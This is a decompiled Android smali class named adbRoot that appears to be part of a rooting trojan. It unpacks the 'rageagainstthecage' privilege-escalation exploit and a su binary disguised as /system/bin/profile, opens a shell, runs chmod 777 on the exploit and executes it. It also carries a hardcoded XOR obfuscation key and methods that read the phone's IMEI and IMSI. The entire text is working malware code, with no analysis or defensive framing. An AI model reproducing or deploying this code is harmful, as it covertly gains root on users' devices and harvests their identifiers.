.class public Lcom/android/root/adbRoot;
.super Ljava/lang/Object;
.source "adbRoot.java"


# static fields
.field private static final BUFFER_SIZE:I = 0x400

.field private static final FNAME_BUSYBOX:Ljava/lang/String; = "busybox"

.field private static final FNAME_RATC:Ljava/lang/String; = "rageagainstthecage"

.field private static final FNAME_SU_BIN:Ljava/lang/String; = "profile"

.field static final KEYVALUE:[B = null

.field private static final SU_EXEC_PATH:Ljava/lang/String; = "/system/bin/profile"

.field private static final TAG:Ljava/lang/String; = "AdbRoot"

.field static keylen:I

.field public static rs:Ljava/lang/Boolean;


# instance fields
.field private ctx:Landroid/content/Context;

.field private handler:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 38
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/android/root/adbRoot;->rs:Ljava/lang/Boolean;

    .line 40
    const-string v0, "6^)(9-p35a%3#4S!4S0)$Yt%^&5(j.g^&o(*0)$Yv!#O@6GpG@=+3j.&6^)(0-=1"

    .line 41
    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    .line 40
    sput-object v0, Lcom/android/root/adbRoot;->KEYVALUE:[B

    .line 43
    sget-object v0, Lcom/android/root/adbRoot;->KEYVALUE:[B

    array-length v0, v0

    sput v0, Lcom/android/root/adbRoot;->keylen:I

    .line 26
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
    .locals 1
    .parameter "ctx"
    .parameter "handler"

    .prologue
    .line 76
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 77
    iput-object p1, p0, Lcom/android/root/adbRoot;->ctx:Landroid/content/Context;

    .line 78
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/android/root/adbRoot;->rs:Ljava/lang/Boolean;

    .line 79
    iput-object p2, p0, Lcom/android/root/adbRoot;->handler:Landroid/os/Handler;

    .line 80
    return-void
.end method

.method public static SaveIncludedZippedFileIntoFilesFolder(ILjava/lang/String;Landroid/content/Context;)V
    .locals 7
    .parameter "resourceid"
    .parameter "filename"
    .parameter "ApplicationContext"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v6, 0x1

    .line 86
    invoke-virtual {p2}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5, p0}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v3

    .line 87
    .local v3, is:Ljava/io/InputStream;
    invoke-virtual {p2, p1, v6}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    .line 88
    .local v1, fos:Ljava/io/FileOutputStream;
    new-instance v2, Ljava/util/zip/GZIPInputStream;

    invoke-direct {v2, v3}, Ljava/util/zip/GZIPInputStream;-><init>(Ljava/io/InputStream;)V

    .line 89
    .local v2, gzis:Ljava/util/zip/GZIPInputStream;
    const/16 v5, 0x400

    new-array v0, v5, [B

    .line 91
    .local v0, bytebuf:[B
    :goto_0
    invoke-virtual {v2, v0}, Ljava/util/zip/GZIPInputStream;->read([B)I

    move-result v4

    .local v4, read:I
    if-gez v4, :cond_0

    .line 94
    invoke-virtual {v2}, Ljava/util/zip/GZIPInputStream;->close()V

    .line 95
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;

    move-result-object v5

    invoke-virtual {v5, v6}, Ljava/nio/channels/FileChannel;->force(Z)V

    .line 96
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->flush()V

    .line 97
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    .line 98
    return-void

    .line 92
    :cond_0
    const/4 v5, 0x0

    invoke-virtual {v1, v0, v5, v4}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_0
.end method

.method static synthetic access$0(Lcom/android/root/adbRoot;)Landroid/content/Context;
    .locals 1
    .parameter

    .prologue
    .line 36
    iget-object v0, p0, Lcom/android/root/adbRoot;->ctx:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$1(Lcom/android/root/adbRoot;)Landroid/os/Handler;
    .locals 1
    .parameter

    .prologue
    .line 37
    iget-object v0, p0, Lcom/android/root/adbRoot;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method public static crypt([B)V
    .locals 4
    .parameter "buffer"

    .prologue
    .line 46
    const/4 v1, 0x0

    .line 47
    .local v1, pos:I
    const/4 v0, 0x0

    .local v0, i:I
    :goto_0
    array-length v2, p0

    if-lt v0, v2, :cond_0

    .line 54
    return-void

    .line 48
    :cond_0
    aget-byte v2, p0, v0

    sget-object v3, Lcom/android/root/adbRoot;->KEYVALUE:[B

    aget-byte v3, v3, v1

    xor-int/2addr v2, v3

    int-to-byte v2, v2

    aput-byte v2, p0, v0

    .line 49
    add-int/lit8 v1, v1, 0x1

    .line 50
    sget v2, Lcom/android/root/adbRoot;->keylen:I

    if-ne v1, v2, :cond_1

    .line 51
    const/4 v1, 0x0

    .line 47
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static getIMEI(Landroid/content/Context;)Ljava/lang/String;
    .locals 2
    .parameter "context"

    .prologue
    .line 57
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 58
    .local v0, mTelephonyMgr:Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_0

    .line 59
    const-string v1, ""

    .line 62
    :goto_0
    return-object v1

    :cond_0
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    goto :goto_0
.end method

.method public static getIMSI(Landroid/content/Context;)Ljava/lang/String;
    .locals 2
    .parameter "context"

    .prologue
    .line 66
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 68
    .local v0, mTelephonyMgr:Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_0

    .line 69
    const-string v1, ""

    .line 72
    :goto_0
    return-object v1

    :cond_0
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v1

    goto :goto_0
.end method

.method private prepareRawFile()Z
    .locals 7

    .prologue
    const-string v6, "rageagainstthecage"

    const-string v5, "profile"

    .line 130
    iget-object v3, p0, Lcom/android/root/adbRoot;->ctx:Landroid/content/Context;

    const-string v4, "rageagainstthecage"

    const-string v4, "rageagainstthecage"

    invoke-static {v3, v6, v6}, Lcom/android/root/Setting;->getRawResource(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    .line 131
    .local v0, b1:Z
    iget-object v3, p0, Lcom/android/root/adbRoot;->ctx:Landroid/content/Context;

    const-string v4, "profile"

    const-string v4, "profile"

    invoke-static {v3, v5, v5}, Lcom/android/root/Setting;->getRawResource(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v1

    .line 133
    .local v1, b2:Z
    const/4 v2, 0x1

    .line 142
    .local v2, b3:Z
    if-eqz v0, :cond_0

    if-eqz v1, :cond_0

    if-eqz v2, :cond_0

    const/4 v3, 0x1

    :goto_0
    return v3

    :cond_0
    const/4 v3, 0x0

    goto :goto_0
.end method

.method private runExploid()Z
    .locals 11

    .prologue
    const-string v8, "\n"

    .line 146
    const/4 v7, 0x0

    .line 147
    .local v7, tmpResult:Z
    new-instance v0, Ljava/io/File;

    iget-object v8, p0, Lcom/android/root/adbRoot;->ctx:Landroid/content/Context;

    invoke-virtual {v8}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v8

    const-string v9, "rageagainstthecage"

    invoke-direct {v0, v8, v9}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 148
    .local v0, Exploit:Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v8

    if-eqz v8, :cond_0

    .line 155
    const/4 v8, 0x1

    :try_start_0
    new-array v6, v8, [I

    .line 156
    .local v6, processId:[I
    const-string v8, "/system/bin/sh"

    const-string v9, "-"

    const/4 v10, 0x0

    invoke-static {v8, v9, v10, v6}, Ljackpal/androidterm/Exec;->createSubprocess(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;[I)Ljava/io/FileDescriptor;

    move-result-object v3

    .line 159
    .local v3, fd:Ljava/io/FileDescriptor;
    new-instance v5, Ljava/io/FileOutputStream;

    invoke-direct {v5, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/io/FileDescriptor;)V

    .line 160
    .local v5, out:Ljava/io/FileOutputStream;
    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, v3}, Ljava/io/FileInputStream;-><init>(Ljava/io/FileDescriptor;)V

    .line 162
    .local v4, in:Ljava/io/FileInputStream;
    new-instance v8, Lcom/android/root/adbRoot$1;

    invoke-direct {v8, p0, v4}, Lcom/android/root/adbRoot$1;-><init>(Lcom/android/root/adbRoot;Ljava/io/FileInputStream;)V

    .line 209
    invoke-virtual {v8}, Lcom/android/root/adbRoot$1;->start()V

    .line 211
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "chmod 777 "

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "\n"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 212
    .local v1, command:Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v5, v8}, Ljava/io/FileOutputStream;->write([B)V

    .line 213
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->flush()V

    .line 215
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v9, "\n"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 216
    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v8

    invoke-virtual {v5, v8}, Ljava/io/FileOutputStream;->write([B)V

    .line 217
    invoke-virtual {v5}, Ljava/io/FileOutputStream;->flush()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 219
    const/4 v7, 0x1

    .line 229
    .end local v1           #command:Ljava/lang/String;
    .end local v3           #fd:Ljava/io/FileDescriptor;
    .end local v4           #in:Ljava/io/FileInputStream;
    .end local v5           #out:Ljava/io/FileOutputStream;
    .end local v6           #processId:[I
    :cond_0
    :goto_0
    return v7

    .line 223
    :catch_0
    move-exception v8

    move-object v2, v8

    .line 224
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public go4root()Z
    .locals 2

    .prologue
    .line 102
    invoke-direct {p0}, Lcom/android/root/adbRoot;->prepareRawFile()Z

    move-result v0

    .line 104
    .local v0, tmpResult:Z
    if-nez v0, :cond_0

    move v1, v0

    .line 126
    :goto_0
    return v1

    .line 107
    :cond_0
    invoke-direct {p0}, Lcom/android/root/adbRoot;->runExploid()Z

    move-result v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    sput-object v1, Lcom/android/root/adbRoot;->rs:Ljava/lang/Boolean;

    .line 126
    sget-object v1, Lcom/android/root/adbRoot;->rs:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    goto :goto_0
.end method
